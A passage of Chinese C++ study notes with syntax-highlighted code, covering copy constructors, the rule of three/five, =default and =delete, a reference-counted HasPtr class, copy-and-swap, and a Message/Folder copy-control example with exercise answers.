&lt;&lt; <span class="string">&quot;X()&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">    <span class="built_in">X</span>(<span class="type">const</span> X&amp;) &#123; std::cout &lt;&lt; <span class="string">&quot;X(const X&amp;)&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">    X&amp; <span class="keyword">operator</span>=(<span class="type">const</span> X&amp;) &#123; std::cout &lt;&lt; <span class="string">&quot;X&amp; operator=(const X&amp;)&quot;</span> &lt;&lt; std::endl; <span class="keyword">return</span> *<span class="keyword">this</span>; &#125;</span><br><span class="line">    ~<span class="built_in">X</span>() &#123; std::cout &lt;&lt; <span class="string">&quot;~X()&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">f</span><span class="params">(<span class="type">const</span> X &amp;rx, X x)</span> </span>&#123;</span><br><span class="line">    std::vector&lt;X&gt; vec;</span><br><span class="line">    vec.<span class="built_in">reserve</span>(<span class="number">2</span>);</span><br><span class="line">    vec.<span class="built_in">push_back</span>(rx);</span><br><span class="line">    vec.<span class="built_in">push_back</span>(x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    X *px = <span class="keyword">new</span> X;</span><br><span class="line">    <span class="built_in">f</span>(*px, *px);</span><br><span class="line">    <span class="keyword">delete</span> px;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">X</span>()</span><br><span class="line"><span class="built_in">X</span>(<span class="type">const</span> X&amp;)  <span class="comment">// 形参复制给实参</span></span><br><span class="line"><span class="built_in">X</span>(<span class="type">const</span> X&amp;)  <span class="comment">// push_back(rx)</span></span><br><span class="line"><span class="built_in">X</span>(<span class="type">const</span> X&amp;)</span><br><span class="line">~<span class="built_in">X</span>()</span><br><span class="line">~<span class="built_in">X</span>()</span><br><span class="line">~<span class="built_in">X</span>()  <span class="comment">// 实参销毁</span></span><br><span class="line">~<span class="built_in">X</span>()  <span class="comment">// delete px</span></span><br></pre></td></tr></table></figure><h3 id="三-五法则">三/五法则</h3><ul><li><p>如果一个类<strong>需要自定义析构函数，几乎可以肯定它也需要自定义拷贝赋值运算符和拷贝构造函数</strong>。</p><blockquote><p>需要析构函数的原因可能是类有指针数据成员，而<strong>合成的析构函数并不会delete指针成员</strong>。<br>而拷贝和赋值时对于这些指针成员不能进行浅复制，否则会有多个指针指向同一内存，析构函数delete时会出问题。</p></blockquote></li><li><p>需要拷贝操作的类也需要赋值操作，反之亦然。<br>然而，无论是需要拷贝构造函数还是需要拷贝赋值运算符都不必然意味着也需要析构函数。</p></li></ul><h4 id="练习13-14">练习13.14</h4><p>Q: 假定 <code>numbered</code> 是一个类，它有一个默认构造函数，能为每个对象生成一个唯一的序号，保存在名为 <code>mysn</code> 的数据成员中。假定 <code>numbered</code> 使用合成的拷贝控制成员，并给定如下函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">f</span> <span class="params">(numbered s)</span> </span>&#123; cout &lt;&lt; s.mysn &lt; endl; &#125;</span><br></pre></td></tr></table></figure><p>则下面代码输出什么内容？</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">numbered a, b = a, c = b;</span><br><span class="line"><span class="built_in">f</span>(a); <span class="built_in">f</span>(b); <span class="built_in">f</span>(c);</span><br></pre></td></tr></table></figure><p>A: 输出3个完全一样的数。</p><h4 id="练习13-15">练习13.15</h4><p>Q: 假定<code>numbered</code> 定义了一个拷贝构造函数，能生成一个新的序列号。这会改变上一题中调用的输出结果吗？如果会改变，为什么？新的输出结果是什么？</p><p>A: 会输出3个不同的数。并且这3个数并不是a、b、c当中的数。</p><h4 id="练习13-16">练习13.16</h4><p>Q: 如果 <code>f</code> 中的参数是 <code>const numbered&amp;</code>，将会怎样？这会改变输出结果吗？如果会改变，为什么？新的输出结果是什么？</p><p>A: 会改变，会输出 a、b、c的数。</p><h3 id="使用-default">使用=default</h3><ul><li>可以通过将拷贝控制成员定义为 <code>=default</code> 来显式地要求编译器生成合成的版本。</li><li>合成的函数将隐式地声明为内联的（就像任何其他类内声明的成员函数一样）。</li><li><strong>只能对具有合成版本的成员函数使用 <code>=default</code>，即默认构造函数或拷贝构造函数。</strong></li></ul><h3 id="阻止拷贝">阻止拷贝</h3><ul><li>大多数类应该定义默认构造函数、拷贝构造函数和拷贝赋值运算符，无论是隐式地还是显式地。<br>但在有些场景下这些操作没有合理的意义，此时定义类时必须采用某种机制阻止拷贝或赋值，比如iostream类阻止复制。</li><li>定义删除的函数：<code>=delete</code> 。</li><li>与<code>=defalut</code>不同，<code>=delete</code>必须出现在函数第一次声明的时候。另一个不同之处在于<strong>可以对除析构函数外的任何函数指定<code>=delete</code></strong>。</li><li>如果一个类有数据成员不能默认构造、拷贝、复制或者销毁，则对应的成员函数将被定义为删除的。<ul><li>一个成员有删除的或不可访问的析构函数会导致合成的默认和拷贝构造函数被定义为删除的——否则会创建出无法销毁的对象。</li><li><strong>对于具有引用成员或无法默认构造的const成员的类，编译器不会为其合成默认构造函数。</strong></li><li><strong>对于有引用成员的类，合成拷贝赋值运算符被定义为删除的——合成的拷贝赋值运算符会进行浅复制，左侧运算对象仍然指向原来的对象，而非独立的副本</strong>。</li></ul></li><li>老版本使用<code>private</code>声明来阻止拷贝（会涉及成员函数和友元的控制问题——拷贝构造函数和赋值运算符应声明为<code>private</code>同时只声明不定义，这样链接时报错能阻止友元和成员函数进行拷贝）。<br>新版本应该使用<code>=delete</code>。</li></ul><h2 id="拷贝控制和资源管理">拷贝控制和资源管理</h2><ul><li>类的行为可以像一个值，也可以像一个指针。<ul><li>行为像值：对象有自己的状态，副本和原对象是完全独立的。</li><li>行为像指针：共享状态，拷贝一个这种类的对象时，副本和原对象使用相同的底层数据。</li></ul></li></ul><h3 id="定义行为像值的类">定义行为像值的类</h3><p>为了实现类值行为，HasPtr需要：</p><ul><li>定义一个拷贝构造函数，完成string的拷贝，而不是拷贝指针；</li><li>定义一个析构函数来释放string；</li><li>定义一个拷贝赋值运算符来<strong>释放对象当前的string，并从右侧运算对象拷贝string</strong>。<ul><li><strong>如果将一个对象赋予它自身时，赋值运算符必须能正确工作</strong>：一个好的方法是在<strong>销毁左侧运算对象资源之前拷贝右侧运算对象</strong>。<br>最好是异常安全的，当异常发生时能将左侧运算对象置于一个有意义的状态。</li><li>大多数赋值运算符<strong>组合了析构函数和拷贝构造函数的工作</strong>。</li></ul></li></ul><h4 id="练习13-25">练习13.25</h4><p>Q: 假定希望定义 <code>StrBlob</code> 的类值版本，而且希望继续使用 <code>shared_ptr</code>，这样我们的 <code>StrBlobPtr</code> 类就仍能使用指向<code>vector</code>的 <code>weak_ptr</code> 了。你修改后的类将需要一个拷贝的构造函数和一个拷贝赋值运算符，但不需要析构函数。解释拷贝构造函数和拷贝赋值运算符必须要做什么。解释为什么不需要析构函数。</p><p>A: 拷贝构造函数和拷贝赋值运算符要重新动态分配内存。因为 <code>StrBlob</code> 使用的是智能指针，当引用计数为0时会自动释放对象，因此不需要析构函数。</p><h3 id="定义行为像指针的类">定义行为像指针的类</h3><p>析构函数不能单方面地释放关联的string，<strong>只有最后一个指向string的HasPtr销毁时，它才可以释放</strong>。<br>一种解决方法是<strong>将计数器保存在动态内存中</strong>，当拷贝或赋值对象时，我们拷贝指向计数器的指针。</p><p>赋值运算符必须能处理自赋值, 当两对象相同时，检查ps和use是否释放之前，计数器就已经被递增过了。</p><h4 id="练习13-27">练习13.27</h4><p>Q: 定义你自己的使用引用计数版本的 <code>HasPtr</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HasPtr</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// constructor: 计数器保存在动态内存中, 初始化为1</span></span><br><span class="line">    <span class="built_in">HasPtr</span>(<span class="type">const</span> std::string &amp;s = std::<span class="built_in">string</span>()) : <span class="built_in">ps</span>(<span class="keyword">new</span> std::<span class="built_in">string</span>(s)), <span class="built_in">i</span>(<span class="number">0</span>), <span class="built_in">use</span>(<span class="keyword">new</span> <span class="built_in">size_t</span>(<span class="number">1</span>)) &#123; &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// copy constructor: 拷贝ps和use指针, 递增计数器</span></span><br><span class="line">    <span class="built_in">HasPtr</span>(<span class="type">const</span> HasPtr &amp;hp) : <span class="built_in">ps</span>(hp.ps), <span class="built_in">i</span>(hp.i), <span class="built_in">use</span>(hp.use) &#123; ++*use; &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// copy-assignment operator: 必须能处理自赋值, 当两对象相同时, 检查ps和use之前</span></span><br><span class="line">    <span class="comment">// 计数器就已经被递增过了</span></span><br><span class="line">    HasPtr&amp; <span class="keyword">operator</span>=(<span class="type">const</span> HasPtr &amp;rhs) &#123;</span><br><span class="line">        ++*rhs.use;</span><br><span class="line">        <span class="keyword">if</span> (--*use == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">delete</span> ps;</span><br><span class="line">            <span class="keyword">delete</span> use;</span><br><span class="line">        &#125;</span><br><span class="line">        ps = rhs.ps;</span><br><span class="line">        i = rhs.i;</span><br><span class="line">        use = rhs.use;</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ~<span class="built_in">HasPtr</span>() &#123;</span><br><span class="line">        <span class="keyword">if</span> (--*use == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">delete</span> ps;</span><br><span class="line">            <span class="keyword">delete</span> use;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    std::string *ps;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">size_t</span> *use;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="交换操作">交换操作</h2><ul><li><p>管理资源的类通常还定义一个名为<code>swap</code>的函数，并非ni必要，但对于分配了资源的类，定义swap可能是一种很重要的优化手段。</p><blockquote><p>在自定义类上定义一个自己版本的swap来重载swap的默认行为，<strong>使其交换指针而非交换对象（交换对象需要进行一次拷贝和两次赋值）</strong>。</p><p>假设你有两个对象，分别为A和B。要将它们交换，你首先需要创建一个临时对象来保存其中一个对象的内容，这是拷贝操作。然后，你需要将A的值赋给B，以及将临时对象的值赋给A，这是两次赋值操作。</p></blockquote></li><li><p>经常用于重排元素顺序的算法。</p></li><li><p>每个<code>swap</code>调用应该是未加限定的，用<code>swap</code>而不是<code>std::swap</code>。如果存在类型特定的<code>swap</code>版本，其匹配优先程度会优于std中定义的版本。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap</span><span class="params">(Foo &amp;lhs, Foo &amp;rhs)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> std::swap;</span><br><span class="line">    <span class="built_in">swap</span>(lhs.h, rhs.h);  <span class="comment">// 使用HasPtr版本的swap, 除非未定义特定类型的swap才会用std::swap</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>拷贝并交换（copy and swap)</strong>：将左侧运算对象与<strong>右侧运算对象的一个副本</strong>进行交换。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注意rhs是按值传递的, 意味着HasPtr的拷贝构造函数将右侧运算对象中的string拷贝到rhs</span></span><br><span class="line">HasPtr&amp; HasPtr::<span class="keyword">operator</span>=(HasPtr rhs) &#123;</span><br><span class="line">    <span class="built_in">swap</span>(*<span class="keyword">this</span>, rhs);</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;  <span class="comment">// rhs被销毁, 从而delete了rhs中的指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>注意参数并非引用，否则<code>=</code>后左右值互换；</li><li>当运算符结束时**，rhs被销毁，HasPtr析构函数执行，delete现指向的内存，即释放掉左侧运算对象原来的内存**；</li><li>它自动处理了自赋值情况且天然是异常安全的——它通过<strong>在改变左侧运算对象之前靠拷贝右侧运算对象。</strong></li></ul></li></ul><h4 id="练习13-29">练习13.29</h4><p>Q: 解释 <code>swap(HasPtr&amp;, HasPtr&amp;)</code>中对 <code>swap</code> 的调用不会导致递归循环。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap</span><span class="params">(HasPtr &amp;lhs, HasPtr &amp;rhs)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> std::swap;</span><br><span class="line">    <span class="built_in">swap</span>(lhs.ps, rhs.ps);  <span class="comment">// 交换指针而非string对象</span></span><br><span class="line">    <span class="built_in">swap</span>(lhs.i, rhs.i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>A: 在此swap函数中又调用了swap来交换HasPtr成员ps和i，但这两个成员的类型分别是指针和整型，都是内置类型，因此函数中swap被解析成std::swap，不会导致递归循环。</p><h4 id="练习13-31">练习13.31</h4><p>Q: 为你的 <code>HasPtr</code> 类定义一个 <code>&lt;</code> 运算符，并定义一个 <code>HasPtr</code> 的 <code>vector</code>。为这个 <code>vector</code> 添加一些元素，并对它执行 <code>sort</code>。注意何时会调用 <code>swap</code>。</p><p>A: 代码略，需要注意的是它应该被声明为const的。<br>关于调用次数，在tdm-gcc 4.8.1中，当元素数小于等于16时sort使用插入排序算法，未使用swap，而是内存区域的整片移动。当元素数大于17时会使用快排，会调用swap，但递归到元素数小于等于16时就会使用插入排序。</p><h4 id="练习13-32">练习13.32</h4><p>Q: 类指针的 <code>HasPtr</code> 版本会从 <code>swap</code> 函数收益吗？如果会，得到了什么益处？如果不是，为什么？</p><p>A: 不会。默认<code>swap</code>版本简单交换两个对象的非静态成员，对于HasPtr来说就是交换string指针ps、引用计数指针use和整型值i。这种语义是符合期望的——两个HasPtr指向了原来对方的string，两种互换string后，各自的引用计数都是不变的（都是减1再加1）。因此，默认swap版本已经能正确处理类指针HasPtr的交换，专用swap版本不会带来更多收益。</p><h2 id="拷贝控制示例">拷贝控制示例</h2><blockquote><p>一定要自己写一遍！</p><p>写代码和学基础知识是一样重要的学习手段。</p></blockquote><h3 id="头文件-message-h">头文件 <code>message.h</code></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Folder</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Message</span> &#123;</span><br><span class="line">  <span class="function"><span class="keyword">friend</span> <span class="type">void</span> <span class="title">swap</span><span class="params">(Message &amp;, Message &amp;)</span></span>;</span><br><span class="line">  <span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">Folder</span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">Message</span><span class="params">(<span class="type">const</span> std::string &amp;str = <span class="string">&quot;&quot;</span>)</span> : contents(str) &#123;</span>&#125;</span><br><span class="line">  <span class="built_in">Message</span>(<span class="type">const</span> Message &amp;);</span><br><span class="line">  Message &amp;<span class="keyword">operator</span>=(<span class="type">const</span> Message &amp;);</span><br><span class="line">  ~<span class="built_in">Message</span>();</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">Save</span><span class="params">(Folder &amp;)</span></span>;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">Remove</span><span class="params">(Folder &amp;)</span></span>;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">PrintDebug</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  std::string contents;</span><br><span class="line">  std::set&lt;Folder *&gt; folders;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 拷贝控制成员的工具函数</span></span><br><span class="line">  <span class="comment">// 将本Message添加到指定参数的Folder中</span></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">AddToFolders</span><span class="params">(<span class="type">const</span> Message &amp;)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 从folders中的每个Folder中删除本Message</span></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">RemoveFromFolders</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">AddFld</span><span class="params">(Folder *f)</span> </span>&#123; folders.<span class="built_in">insert</span>(f); &#125;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">RemFld</span><span class="params">(Folder *f)</span> </span>&#123; folders.<span class="built_in">erase</span>(f); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap</span><span class="params">(Message &amp;, Message &amp;)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Folder</span> &#123;</span><br><span class="line">  <span class="function"><span class="keyword">friend</span> <span class="type">void</span> <span class="title">swap</span><span class="params">(Folder &amp;, Folder &amp;)</span></span>;</span><br><span class="line">  <span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">Message</span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">Folder</span>() = <span class="keyword">default</span>;</span><br><span class="line">  <span class="built_in">Folder</span>(<span class="type">const</span> Folder &amp;);</span><br><span class="line">  Folder &amp;<span class="keyword">operator</span>=(<span class="type">const</span> Folder &amp;);</span><br><span class="line">  ~<span class="built_in">Folder</span>();</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">PrintDebug</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  std::set&lt;Message *&gt; msgs;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 拷贝控制成员的工具函数</span></span><br><span class="line">  <span class="comment">// 将Folder添加到msgs中</span></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">AddToMessage</span><span class="params">(<span class="type">const</span> Folder &amp;)</span></span>;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">RemoveFromMessage</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">AddMsg</span><span class="params">(Message *m)</span> </span>&#123; msgs.<span class="built_in">insert</span>(m); &#125;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">RemMsg</span><span class="params">(Message *m)</span> </span>&#123; msgs.<span class="built_in">erase</span>(m); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap</span><span class="params">(Folder &amp;, Folder &amp;)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="源文件-message-cpp">源文件 <code>message.cpp</code></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;message.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Message::Save</span><span class="params">(Folder &amp;f)</span> </span>&#123;  <span class="comment">// 用引用: 会改变Folders</span></span><br><span class="line">  folders.<span class="built_in">insert</span>(&amp;f);</span><br><span class="line">  f.msgs.<span class="built_in">insert</span>(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Message::Remove</span><span class="params">(Folder &amp;f)</span> </span>&#123;</span><br><span class="line">  folders.<span class="built_in">erase</span>(&amp;f);</span><br><span class="line">  f.msgs.<span class="built_in">erase</span>(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Message::AddToFolders</span><span class="params">(<span class="type">const</span> Message &amp;m)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> f : m.folders) &#123;</span><br><span class="line">    f-&gt;<span class="built_in">AddMsg</span>(<span class="keyword">this</span>);</span><br><span class="line">    <span class="comment">// f-&gt;AddMsg(&amp;m);  // Err: 不能把const元素插入非const容器</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Message::<span class="built_in">Message</span>(<span class="type">const</span> Message &amp;m) : <span class="built_in">contents</span>(m.contents), <span class="built_in">folders</span>(m.folders) &#123;</span><br><span class="line">  <span class="built_in">AddToFolders</span>(m);  <span class="comment">// 将本消息添加到m的Folders中</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Message::RemoveFromFolders</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> f : folders) &#123;</span><br><span class="line">    f-&gt;<span class="built_in">RemMsg</span>(<span class="keyword">this</span>);  <span class="comment">// 从folders中每个指针删除本Message</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Message::~<span class="built_in">Message</span>() &#123; <span class="built_in">RemoveFromFolders</span>(); &#125;</span><br><span class="line"></span><br><span class="line">Message &amp;Message::<span class="keyword">operator</span>=(<span class="type">const</span> Message &amp;rhs) &#123;</span><br><span class="line">  <span class="built_in">RemoveFromFolders</span>();</span><br><span class="line">  contents = rhs.contents;</span><br><span class="line">  folders = rhs.folders;</span><br><span class="line">  <span class="built_in">AddToFolders</span>(rhs);</span><br><span class="line">  <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap</span><span class="params">(Message &amp;lhs, Message &amp;rhs)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">using</span> std::swap;</span><br><span class="line">  lhs.<span class="built_in">RemoveFromFolders</span>();  <span class="comment">// 友元函数访问private方法(访问上并非是通过lhs去访问到)</span></span><br><span class="line">                            <span class="comment">// private方法访问友元类private成员变量msgs</span></span><br><span class="line">  <span class="comment">// for (auto f : rhs.folders) &#123;</span></span><br><span class="line">  <span class="comment">//   f-&gt;RemMsg(&amp;rhs);  // 友元函数没法访问友元类中的private成员变量msgs</span></span><br><span class="line">  <span class="comment">// &#125;</span></span><br><span class="line">  rhs.<span class="built_in">RemoveFromFolders</span>();</span><br><span class="line">  <span class="built_in">swap</span>(lhs.contents, rhs.contents);</span><br><span class="line">  <span class="built_in">swap</span>(lhs.folders, rhs.folders);</span><br><span class="line">  lhs.<span class="built_in">AddToFolders</span>(lhs);</span><br><span class="line">  rhs.<span class="built_in">AddToFolders</span>(rhs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Folder Implementation</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap</span><span class="params">(Folder &amp;lhs, Folder &amp;rhs)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">using</span> std::swap;</span><br><span class="line">  lhs.<span class="built_in">RemoveFromMessage</span>();</span><br><span class="line">  rhs.<span class="built_in">RemoveFromMessage</span>();</span><br><span class="line">  <span class="built_in">swap</span>(lhs.msgs, rhs.msgs);</span><br><span class="line">  lhs.<span class="built_in">AddToMessage</span>(lhs);</span><br><span class="line">  rhs.<span class="built_in">AddToMessage</span>(rhs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Folder::AddToMessage</span><span class="params">(<span class="type">const</span> Folder &amp;f)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> m : f.msgs) &#123;</span><br><span class="line">    m-&gt;<span class="built_in">AddFld</span>(<span class="keyword">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Folder::RemoveFromMessage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> m : msgs) &#123;</span><br><span class="line">    m-&gt;<span 